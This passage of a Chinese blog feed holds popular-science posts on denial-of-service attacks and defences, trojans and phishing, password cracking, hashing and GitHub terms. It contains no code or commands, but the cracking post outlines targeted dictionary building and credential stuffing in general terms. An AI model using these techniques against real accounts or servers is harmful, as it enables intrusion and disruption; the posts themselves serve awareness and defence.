alt=""><br>什么情况下会出现拒绝服务攻击呢？</p><p><strong>举个黑客利用僵尸网络进行拒绝服务攻击的栗子：</strong></p><p>小A和小B同时开了某游戏的私服，想要从中挣点零花钱。其中小A的私服中在线人数通常几百人，而小B的私服中在线人数寥寥无几。</p><p>都说同行是冤家啊，小B心里那个嫉妒啊，于是小B花了几千块钱找到了某个黑客，想治治小A。</p><p>黑客拿钱办事，发动了自己的几千台僵尸主机，同时对小A的私服进行攻击。</p><p>这种情况下，小A的服务器严重堵车。真正在私服内玩耍的玩家们发现突然游戏画面卡成PPT了，感觉游戏体验及其恶劣，纷纷下线，甚至直接退游。</p><p>于是，小B恶心小A的目的就达成了。</p><h1 id="02-拒绝服务攻击理性认知"><a href="#02-拒绝服务攻击理性认知" class="headerlink" title="02 拒绝服务攻击理性认知"></a>02 拒绝服务攻击理性认知</h1><p>就像你在家呆着，突然有人敲门，你就得去看一眼一样，你并不能要求不要有人来敲门。</p><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200524105725386.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>拒绝服务攻击<strong>只能缓解而不能根除</strong>，也就是说你要是碰不到还好，要是碰到了，那你就烧钱吧，花钱请个保安（云Waf）在门口帮你蹲着。</p><p>其实很多安全公司就是靠卖防范拒绝服务攻击产品的，可以说没有拒绝服务攻击，他们都无法卖货咯</p><p>拒绝服务攻击其中有DOS攻击和DDOS攻击：</p><p>Dos攻击：<br>Dos攻击是拒绝服务攻击的一种，<br>它通过耗尽CPU、内存、带宽以及磁盘空间等系统资源,<br>来阻止或削弱对网络、系统或应用程序的授权使用的行为。</p><p>DDoS攻击：<br>分布式拒绝服务，产生灾难性的流量攻击。</p><p><br><br></p><h1 id="03-常见拒绝服务攻击"><a href="#03-常见拒绝服务攻击" class="headerlink" title="03 常见拒绝服务攻击"></a>03 常见拒绝服务攻击</h1><h2 id="1、Ping-of-death-（死亡之Ping）"><a href="#1、Ping-of-death-（死亡之Ping）" class="headerlink" title="1、Ping of death （死亡之Ping）"></a>1、Ping of death （死亡之Ping）</h2><p>在1996年以前，你想要发动拒绝服务攻击，你只需要构造一个Ping包，让这个ICMP报文大于65535后发送给目标主机。</p><p>目标主机由于<strong>协议栈不完善</strong>的原因，处理报文出错，就会出现系统瘫痪，比如windows系统就会出现<strong>蓝屏死机</strong>的情况。</p><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200524105746579.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>而现在，随着TCP/IP协议栈的不断完善，现在这个方法已经行不通了</p><p><br><br></p><h2 id="2、Tear-drop（泪滴攻击）"><a href="#2、Tear-drop（泪滴攻击）" class="headerlink" title="2、Tear drop（泪滴攻击）"></a>2、Tear drop（泪滴攻击）</h2><p>在二十多年前，windows95那个时代，也是由于通信协议栈的不完善，当UDP分片重叠时，报文重叠会导致协议栈处理出错。</p><p>往往你只需要发送一个对应的报文，对方主机就会死机。</p><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200524105758144.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>而现在，随着TCP/IP协议栈的不断完善，现在这个方法也已经行不通了<br><br><br></p><h2 id="3、SYN-ACK-Flood（SYN欺骗攻击）"><a href="#3、SYN-ACK-Flood（SYN欺骗攻击）" class="headerlink" title="3、SYN ACK Flood（SYN欺骗攻击）"></a>3、SYN ACK Flood（SYN欺骗攻击）</h2><p>黑客伪造大量源IP地址，发送SYN包到目标服务器。</p><p>目标服务器接收到该数据包后，会回复一个SYN ACK包，并且记录下该SNY包的详细信息。</p><p>对伪造的源IP地址来说：</p><p>如果它确实存在，那么这台主机在接收到服务器发送过来的SYN ACK报文后，就会感觉十分迷惑，我什么时候给你发送SYN包了？接着该主机就会回复服务器，我不需要你的服务</p><p>而如果它不存在，那么服务器在一定时间内，就会以为对方没有听见。于是持续的发送SYN ACK包，直到察觉对方不存在，而到这已经占用了服务器的许多资源。</p><p>就这样，<strong>服务器为了一些莫名其妙的源IP耗费了很多精力，填写了很多TCP连接表无效信息，而这个连接许可登记表都被填满了，那么正常的用户就无法连接了</strong>。<br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200524105827397.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p><strong>面对这种攻击，我们该如何抵御呢？</strong></p><p>确实有一种方法叫做，<strong>SYN Cookie防御机制</strong>。</p><p>SYN Cookie是对TCP服务器端的三次握手协议作一些修改，专门用来防范SYN Flood攻击的一种手段。</p><p>它的原理是，在TCP服务器收到TCP SYN包并返回TCP SYN+ACK包时，不分配一个专门的数据区，而是根据这个SYN包计算出一个cookie值。再收到TCP ACK包时，TCP服务器在根据那个cookie值检查这个TCP ACK包的合法性。如果合法，再分配专门的数据区进行处理未来的TCP连接。</p><p><strong>打个比方来说就是，你呆在家，当有人敲门的时候，你并没有马上到门口看是谁在敲门，而是先核实了对方身份后再去开门。这样就免去了不必要的，一次次走到门口仔细看对方是谁的麻烦。</strong><br><br></p><h2 id="4、反射攻击"><a href="#4、反射攻击" class="headerlink" title="4、反射攻击"></a>4、反射攻击</h2><p>反射攻击比较狡猾，这种一种借刀杀人的方法。</p><p>他会伪造源IP地址为受害人地址，目的IP地址位中间媒介地址，这样子中间媒介地址会给受害人地址发送应答包，导致受害者的网络瘫痪。</p><p>而黑客则是在隔岸观火。<br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200524105846864.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>对于黑客而言，发送数据的具体内容可以是UDP报文，也可以是TCP握手报文，还可以是对开启了回送服务的中间媒介发送任何消息。</p><p>总之一句话，<strong>我挑拨你们两的关系，你两互相吵去吧</strong>。<br><br></p><h2 id="5、放大攻击"><a href="#5、放大攻击" class="headerlink" title="5、放大攻击"></a>5、放大攻击</h2><p>放大攻击比较阴险，这种一种<strong>替目标服务器拉仇恨的方法</strong></p><p>他会伪造源IP地址为受害人地址，而目的IP是广播地址或者DNS服务器地址，在这个广播里的所有主机或者是对应的DNS服务器都会回应受害人地址，发送应答报文。</p><p>黑客常利用的广播攻击有，基于ICMP的 ICMP Smurf攻击，基于UDP 的Fraggle攻击等无连接报文。<br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200524105902674.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>6、僵尸网络</p><p>这是种<strong>收小弟</strong>的攻击方法，攻击者平时通过各种方式获得许多主机的控制权，将其变为肉鸡。</p><p>在关键时刻，肉鸡可以同时利用以上几种方法，同时对目标服务器进行攻击。<br><br></p><h1 id="04-对于拒绝服务攻击，我们要做的"><a href="#04-对于拒绝服务攻击，我们要做的" class="headerlink" title="04 对于拒绝服务攻击，我们要做的"></a>04 对于拒绝服务攻击，我们要做的</h1><h2 id="1、未雨绸缪"><a href="#1、未雨绸缪" class="headerlink" title="1、未雨绸缪"></a>1、未雨绸缪</h2><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200524105913694.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><strong>1.1 对于SYN 欺骗攻击，如上文所述，采用SYN Cookie防御机制。</strong></p><p>SYN Cookie是对TCP服务器端的三次握手协议作一些修改，专门用来防范SYN Flood攻击的一种手段。</p><p>它的原理是，在TCP服务器收到TCP SYN包并返回TCP SYN+ACK包时，不分配一个专门的数据区，而是根据这个SYN包计算出一个cookie值。<br>再收到TCP ACK包时，TCP服务器在根据那个cookie值检查这个TCP ACK包的合法性。如果合法，再分配专门的数据区进行处理未来的TCP连接。<br><br><br><strong>1.2 对于攻击者伪造源IP的行为，我们可以使用路由器安全配置</strong></p><p>通过配置，使得路由器能记录下不同主机的位置信息（IP地址、MAC地址、端口信息），当攻击者伪造IP时，路由器可通过查表发现该端口与IP地址不符，便丢弃该数据包。<br><br><br><strong>1.3 对于HTTP拒绝服务，我们可以使用验证码机制、重定向</strong></p><p>如果主机需要访问该页面，则需要进行输入验证码，这样就避免了很多无意义的访问，但对于用户来说体验感不好</p><p>还有一种方法是重定向，这种方法用户体验感好</p><p><br><br></p><h2 id="2、亡羊补牢"><a href="#2、亡羊补牢" class="headerlink" title="2、亡羊补牢"></a>2、亡羊补牢</h2><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200524105924797.jpg#pic_center" alt=""><br>不怕一万，就怕万一，万一真的发现流量异常，服务器快承受不住了，该怎么办呢？</p><p>安全人员会这么做：</p><p>①捕获数据包，先抓包来看看到底是怎么回事</p><p>②分析数据包，数据包里有没有线索</p><p>③判定攻击类型</p><p>④确保防御机制开启(防欺骗、限速率、代理验证)</p><p>⑤黑名单阻断恶意流量</p><p>⑥对正常流量建立基线,</p><p>⑦快速识别异常流量</p><p>⑧恢复正常<br><br></p><h2 id="3、总结经验"><a href="#3、总结经验" class="headerlink" title="3、总结经验"></a>3、总结经验</h2><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200524105931949.png#pic_center" alt=""><br>总结经验是为了之后更好的预防，安全人员可以这么做</p><p>①建立Neo4j图数据库,<br>便于后期分析</p><p>②存储安全事件，记录在安全漏洞数据库中</p><p>③对安全事件进行攻击链溯源分析</p><p>④对病毒家族进行威胁成长分析</p><p>⑤输出误报、漏报、确证报告</p><p>⑥优化防御模型</p><p><strong>以上便是，我分享的关于拒绝服务攻击的认知</strong></p><hr><p><strong>插个题外话</strong>：</p><p>阿里巴巴啊，真的是牛逼，要知道每年双十一的时候，从流量上来看，阿里巴巴公司服务器承受的就是<strong>世界级的拒绝服务攻击</strong>。</p><p>就算是平时，阿里巴巴服务器也相当于生活在拒绝服务攻击之中，总之阿里巴巴，牛！</p><p>如果中小型企业担心遭受拒绝服务攻击怎么办？</p><p>这里也推荐中小型企业<strong>购买阿里的云Waf</strong>，是真的香~~</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> 拒绝服务攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见的网络安全威胁有哪些？</title>
      <link href="/2020/07/19/chang-jian-de-wang-luo-an-quan-wei-xie-you-na-xie/"/>
      <url>/2020/07/19/chang-jian-de-wang-luo-an-quan-wei-xie-you-na-xie/</url>
      
        <content type="html"><![CDATA[<p>本文将简单介绍<strong>木马、钓鱼网站、流氓软件、暴力破解</strong>这四种常见的网络安全威胁。</p><p>这里有四个简单的问题，供大家思考？</p><p><strong>01 说到木马你会想到什么？</strong></p><p><strong>02 说到钓鱼网站你会想到什么？</strong></p><p><strong>03 说到流氓软件你会想到什么？</strong></p><p><strong>04 说到暴力破解你会想到什么？</strong></p><p>那么接下来，我就来简单介绍一下相关内容。</p><h2 id="01-说到木马你会想到什么？"><a href="#01-说到木马你会想到什么？" class="headerlink" title="01 说到木马你会想到什么？"></a><strong>01 说到木马你会想到什么？</strong></h2><p>其实啊，简单来说，木马就相当于一个桥梁，连接着攻击者的主机和被攻击者的主机。在这种联系下，攻击者可以通过木马来远程控制被攻击者的计算机。</p><p>具体来说:<br>口令邮箱型:在2000年左右，经常发现网吧里计算机被植入该木马。</p><p>其受害场景为用户来到了网吧，登录了游戏账号、QQ账号的，这时木马会记录你的输入，并发送到指定邮箱。</p><p>除此之外，还有远程访问型、密码访问型、键盘记录型等</p><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200512160133792.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p><br><br></p><h2 id="02-说到钓鱼网站你会想到什么？"><a href="#02-说到钓鱼网站你会想到什么？" class="headerlink" title="02 说到钓鱼网站你会想到什么？"></a><strong>02 说到钓鱼网站你会想到什么？</strong></h2><p>钓鱼网站，顾名思义就和钓鱼一样，把你当成鱼儿，给你鱼饵，诱导你上钩。</p><p>那这里所谓的鱼饵是什么呢？就是一些仿真的网站，比如看上去是QQ登录页面，实际上除了记录你输入的账号、密码外，没有其他功能。</p><p>在这里介绍一最基本的网络钓鱼方式，</p><p>受害场景举例：<br>1）你收到邮件、短信，内容类似于说：你的银行账号有风险 ，需要登录官网,进行账号信息修改。并附上一段链接。.<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200512160204131.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br><br>2）你看了短信心里很慌张，你赶紧点击链接，发现页面信息非常齐全、正规，于是你放心输入账号、密码<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200512160217805.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><br><p>3）你登录成功后，发现跳转页面显示一片白或者又跳转会登录界面，一脸懵逼。而实际上你的账号密码已经被人获知，也就是你上钩咯</p><h2 id="03-说到流氓软件你会想到什么？"><a href="#03-说到流氓软件你会想到什么？" class="headerlink" title="03 说到流氓软件你会想到什么？"></a><strong>03 说到流氓软件你会想到什么？</strong></h2><p>流氓软件就像一个不安分的恶棍，要么他自带很多刀具、乱花你的钱、要么本身就是坏人</p><p>具体来说:<br>①你从不正规网站下载软件，给你捆绑了很多软件<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200512160230915.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><br>②偷偷后台运行，疯狂跑流量<br><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200512160239733.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br>③本身被修改过了，携带着病毒或者木马<br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200512160253195.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p><br><br></p><h2 id="04-说到暴力破解你会想到什么？"><a href="#04-说到暴力破解你会想到什么？" class="headerlink" title="04 说到暴力破解你会想到什么？"></a><strong>04 说到暴力破解你会想到什么？</strong></h2><p>暴力破解简单来说就是枚举，列举出所有可能组合</p><p>打个比方就是，你要作对4道选择题，每个选择题有3个选项，那么你可以列举出12种可能，必定有一次全对。</p><p>暴力破解常用于没有设置登陆限制的管理员登陆页面等</p><p> <img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200512160423237.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>        <br><br>    <a href="https://blog.csdn.net/qq2539879928/article/details/105807814" target="_blank" rel="noopener external nofollow noreferrer">关于了解暴力破解更多内容，可以戳这里</a></p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 科普 </tag>
            
            <tag> 安全威胁 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初谈黑客破解密码的原理</title>
      <link href="/2020/07/19/chu-tan-hei-ke-po-jie-mi-ma-de-yuan-li/"/>
      <url>/2020/07/19/chu-tan-hei-ke-po-jie-mi-ma-de-yuan-li/</url>
      
        <content type="html"><![CDATA[<p>个人以为，破解密码的方法主要有四种：</p><h2 id="1）暴力破解（我很笨，但坚持下去我肯定能成功）"><a href="#1）暴力破解（我很笨，但坚持下去我肯定能成功）" class="headerlink" title="1）暴力破解（我很笨，但坚持下去我肯定能成功）"></a>1）暴力破解（我很笨，但坚持下去我肯定能成功）</h2><p>简单来说就是一个一个密码试过去，只要密码字典足够大，破解时间足够长，总会破解出来。在没有针对性的情况下，这是一种耗时耗力的笨方法。<strong>举个例子，比如你要做100道选择题，每个选择题有3个选项。运气比较差的情况下，你需要尝试到第300次，才可以破解密码。</strong></p><p>那么，我们有没有方法去试图降低这种穷举法的难度呢？</p><p>答案是有的，而这种方法是——破解密码前期，进行相关的信息收集，利用相关消息创建一个有针对性的字典。</p><p>这种关键信息包括什么呢？你可以稍微回想一下你自己设置密码的习惯。</p><p>通常来说，身份证号、出身日期、姓名、邮箱等信息后，往往会出现在我们的密码中。当我们如果想要登录一个管理员后台的时候，如果我们能够获知以上关键信息，利用字典生成器生成有针对性的爆破字典，破解难度会显著下降。<strong>就类似于，100道选择题，通过你的前期努力，你已经排除了某些选项，就算运气再差，你也只需要200次就可以全对一次。</strong></p><p>当然，如果你没法获得关键信息，也可以尝试使用普适的弱口令字典，如123456、admin等组成，试试运气。万一见鬼了呢？对吧。</p><p>那我们什么情况下适合尝试暴力破解呢？</p><p>①密码长度通常较短，如wifi、word、rar密码等。</p><p>②不限制错误登录次数的登录页面，如没做限制的管理员登录页面等。</p><h2 id="2）撞库法（谁叫你都设置一个密码）"><a href="#2）撞库法（谁叫你都设置一个密码）" class="headerlink" title="2）撞库法（谁叫你都设置一个密码）"></a>2）撞库法（谁叫你都设置一个密码）</h2><p>这个方法简单来说，就是从黑客从其他渠道了解到你在某些平台上的账号密码，然后用该账号密码登录其他平台，看看你是不是也是用了这个密码。打个比方，你有两个密码箱，你习惯性的设置成同一个密码，当你打开一个密码箱的时候，被人看到了你输密码的过程，那么你的另一个密码箱是否还安全呢？</p><p>那为什么叫做撞库法呢？按我的理解，因为实际上，我们的账号密码都存储在一个叫做数据库的地方，如果这个数据库被人窃取了，黑客就会用这个数据库里的信息去尝试登陆其他平台，如果登陆成功，那就是两个平台的数据碰巧撞上了。顾名思义，撞库法。</p><h2 id="3）统计分析攻击（让我用脑子统计统计）"><a href="#3）统计分析攻击（让我用脑子统计统计）" class="headerlink" title="3）统计分析攻击（让我用脑子统计统计）"></a>3）统计分析攻击（让我用脑子统计统计）</h2><p>分析明文、密文的统计规律来破译密码。</p><p>比如说你对截获的密文进行分析，也对明文进行分析，将两者的统计规律进行比较，从中提取出明文与密文的对应变换关系。</p><p>当我们有机会同时获知明文、明文的情况下，可以进行统计分析。（难度较高，需要专业知识支撑）</p><h2 id="4-数学分析攻击（看我找到你的特征了吧）"><a href="#4-数学分析攻击（看我找到你的特征了吧）" class="headerlink" title="4)数学分析攻击（看我找到你的特征了吧）"></a>4)数学分析攻击（看我找到你的特征了吧）</h2><p>攻击者针对加密算法的数学基础或者密码学知识，通过数学求解的方式来破译密码。</p><p>当我们获知密文的内容，发现有某种加密算法的特征的时候，我们可以针对性求解。</p><p><strong>现在有些密码会进行特定的编码，现在有许多在线解密工具，我们了解相应编码的特征，在线求解即可。</strong></p><p>在此，列举出一些编码方式的特点和实例供大家参考：<br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200428103607696.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>以上观点，仅供参考~</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 科普 </tag>
            
            <tag> 密码破解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于hash，你不得不知的秘密</title>
      <link href="/2020/07/19/guan-yu-hash-ni-bu-de-bu-zhi-de-mi-mi/"/>
      <url>/2020/07/19/guan-yu-hash-ni-bu-de-bu-zhi-de-mi-mi/</url>
      
        <content type="html"><![CDATA[<p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200507154235164.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><h2 id="hash的重要性？"><a href="#hash的重要性？" class="headerlink" title="hash的重要性？"></a><strong>hash的重要性？</strong></h2><p>大家可能有过这样的经历，大家用电脑在某不知名的网站下载了一个应用。然后安装该应用的时候，发现各种捆绑软件也被安装了。这让我们非常头疼。</p><p>那为什么会产生这种情况呢？原因是你下载的并不是纯净的应用，而是一个被大家填填补补过的应用。或许是被加入了木马、或者是被捆绑了软件。</p><p>那我们有没有方法避免这种尴尬情况的发生呢？那必须有，那就是判断hash值</p><p><strong>①本地生成应用hash值</strong><br>当我们出于下载速度或其他原因从第三方网站下载某个应用的时候，我们可以使用hash工具对该应用生成一个hash值，这里简称它为本地hash值</p><p><strong>②获知官网hash值</strong><br>搜索该应用官网，获知该软件对应的hash值，这里简称它为官网hash值。</p><p><strong>③对比hash值</strong><br>如果官网hash值和本地hash值一样，那么你所下载的应用就是安全的。<br>如果不一样，那么你所下载的软件就是被修改过的。</p><h2 id="hash是什么？"><a href="#hash是什么？" class="headerlink" title="hash是什么？"></a>hash是什么？</h2><p>hash，一般翻译为”散列”，主要用于信息安全领域的加密算法，通过hash可以把一些不同长度的信息转化成杂乱的128位的编码里，叫做hash值。</p><p>hash函数可以用来做什么？<br><strong>1）文件校验</strong>（即给文件打个标记，之后如果发现标记不对，说明不是原来的文件）</p><pre><code>  ①文件传输后的校验，将得到的目标文件计算进行md5运算，与源文件的md5比对，如果两者一致，可以从统计上保证两个文件的每一个码元也是完全相同的。典型的如：FTP服务  ②保存二进制文件系统的数字指纹，以便检测文件系统是否未经允许的被修改。在系统初始安装完毕后，建立对文件系统的基础校验，因为散列校验和的长度很小，所以很容易存储。这类比于记个标记。此后，可以定期或者根据需要，再次计算文件系统的校验和。如果发现两次的校验和不匹配，说明该文件已经被非法修改，或者是被病毒感染，或者被木马程序代替。</code></pre><p><strong>2）数字签名</strong></p><pre><code> 运用非对称加密和hash函数结合实现数字签名，也就是应用自己的私钥对散列值进行加密所得到的的结果就是“数字签名”。</code></pre><p><strong>3）网站和系统安全</strong></p><pre><code>网站程序涉及到的数据库中，存放着用户的用户名和密码，如果采用明码存放在数据库中，一旦数据库被人恶意下载并打开，就能直接看到用户名和密码，从而造成系统用户信息的泄露。 针对以上问题，解决的方法通常是将数据加密后放入数据库中，常见的是将用户名明码存放，将密码加密后存放。而这对加密算法就有要求：单向、不可逆、不能被算法还原。MD5算法就符合这个条件</code></pre><p>   <strong>4）PKI</strong></p><pre><code>   公钥基础设施（PKI）是一种运用公钥的概念与技术来实施并提供安全服务的具有普遍适用性的网络安全基础设施。而Hash函数在PKI中有着极其重要的地位，它可以额进行数据源认证和数据的完整性验证，还可以获得信息摘要。    消息摘要有两个基本属性：两个不同的报文难以生成相同的消息摘要；难以对一个指定的摘要生成一个报文，只能由报文推算出消息摘要。  一台自动取款机(ATM)不需要解密一个消费者的个人标识数字（PIN码）。磁条卡将顾客的代码单向地加密成一段HASH值，一旦插卡时，ATM机将计算用户PIN码的HASH值并产生一个结果，然后再将这段结果与用户卡上的HASH值比较。使用这种方法，PIN码是安全的，即使那些维护修理ATM机的人员也无法获取用户的信息。</code></pre><h2 id="Hash函数应满足的性质是什么？"><a href="#Hash函数应满足的性质是什么？" class="headerlink" title="Hash函数应满足的性质是什么？"></a>Hash函数应满足的性质是什么？</h2><p>那么根据上文的描述，我们很容易就可以想到hash函数的性质，即</p><p>1）<strong>单向性</strong>，从预映射，能够简单迅速的得到散列值，而在计算上不可能构造一个预映射，使其散列结果等于某个特定的散列值，即构造相应的M=H-1(h)不可行。</p><p>2）<strong>抗冲突性</strong>，即在统计上无法产生2个散列值相同的预映射。</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码学 </tag>
            
            <tag> Hash </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于GitHub上的一些名词解释（理解向）</title>
      <link href="/2020/07/19/guan-yu-github-shang-de-yi-xie-ming-ci-jie-shi-li-jie-xiang/"/>
      <url>/2020/07/19/guan-yu-github-shang-de-yi-xie-ming-ci-jie-shi-li-jie-xiang/</url>
      
        <content type="html"><![CDATA[<p>本文将以一个Github小白的视角，去解释访问Github时常见的一些名词及使用场景。<strong>专供Github小白上手使用<del>~</del></strong></p><p>小白经历的事情：<strong>下载源代码  -&gt;  发表评论 -&gt; 动手修改源代码   -&gt; 提交修改的代码</strong></p><p>解释的名词包括：<br><strong>Repository、Fork、clone、Issue、PullRequest、<br>Git：Branch、add、Commit、push</strong></p><p>hello 大家好，<br>我是一个Github小白，我上Github最初的目的是想看看各路神仙的开源代码，长长见识，跟着锻炼锻炼。</p><p><strong>1）下载源代码</strong> </p><p>好，那我首先想要下载各路大神的源代码，我该如何操作呢？<br>我可以直接在大神的<strong>Repository</strong>（代码仓库）动手脚不，那肯定是不行。就相当于你借了领导一本正在写的手稿，你好意思在上面涂涂改改嘛。</p><p>所以我们得首先<strong>fork</strong>（克隆）别人的仓库，就相当于你把领导的手稿拿过来去复印店复印了一份，不耽误自己看，又不影响领导的写书进度。</p><p>好啦，仓库复制了一份，接下来我就该把仓库里的东西揣回家好好观摩啦，即将仓库中的项目clone到本地。类比于，把手稿拿回家好好看。</p><p><strong>2）发表评论</strong><br>我源代码看的津津有味，心里想着这块代码段设计的好，对我很有借鉴意义。同时也发现一些地方存在的一些小Bug，想要反馈给代码贡献者。于是我就在<strong>Issue</strong>（评论/BUG反馈）发表了自己的观点，其中包括我对目前项目的改进建议以及对存在的BUG的指出。</p><p><strong>3）动手修改源代码</strong><br>就这样，慢慢的，我代码看的多了，自己动手实践多了。我觉得自己不仅可以提出建议，反馈BUG，我还可以自己上手改代码了。我觉得可以帮领导写文章啦。</p><p>来吧，说干就干。拿着这个<strong>clone</strong>（克隆代码）到本地的源代码，我自己上手进行改bug和添加新功能。这就相当于，拿着领导的复印版手稿，自己上手改错别字以及继续完善内容。</p><p>那就是我到底是如何具体修改手稿的呢？</p><p>①创建branch（分支）：除了手稿本身（master分支），我们是不是得多拿几张空白纸（branck新分支）来写我们的想法</p><p>②add、commit(提交)：把我们写的几张内容加入到手稿中（add），装订成册（commit）</p><p>③push（推送到远程仓库）：把我装订成册的手稿光明正大带到公司去</p><p><strong>4）提交修改的代码</strong></p><p>做了自己的一些修改之后，我想要<strong>PullRequest</strong>一下，即<strong>将你的修改通知原来的作者，希望他合并你的修改</strong>。老板，我对你的手稿做了修改，你看看行不行嘞</p><p>至于我的修改能不能生效呢，这还得看代码贡献者怎么看。代码贡献者觉得你的修改没有错，那么他就会接受修改，<strong>merge</strong>（合并）到自己的仓库。领导：同志，你很不错，这修改很成功。</p>]]></content>
      
      
      <categories>
          
          <category> GitHub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 名词理解 </tag>
            
            <tag> 小白入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>三层交换机原理解析</title>
      <link href="/2020/07/19/san-ceng-jiao-huan-ji-yuan-li-jie-xi/"/>
      <url>/2020/07/19/san-ceng-jiao-huan-ji-yuan-li-jie-xi/</url>
      
